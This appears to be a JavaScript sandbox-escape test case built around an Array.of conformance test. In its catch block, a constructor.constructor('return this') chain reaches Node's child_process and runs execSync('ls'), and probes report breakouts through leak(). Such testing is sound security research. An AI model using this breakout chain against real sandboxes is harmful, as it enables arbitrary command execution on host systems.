try {
    var hits = 0;
    var value;
    var _this_;
    function Pack() {
        let REPLACER = 23;
        Object.defineProperty(this, 'length', {
            set: function (len) {
                throw () => {
                    return () => {
                    };
                };
                hits++;
                value = len;
                _this_ = this;
            }
        });
    }
    var result = Array.of.call(Pack, 'wolves', 'cards', 'cigarettes', 'lies');
    assert.sameValue(hits, 1, 'instance length setter called once');
    assert.sameValue(value, 4, 'setter is called with the number of Array.of arguments');
    assert.sameValue(_this_, result, 'setter is called with the new object');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}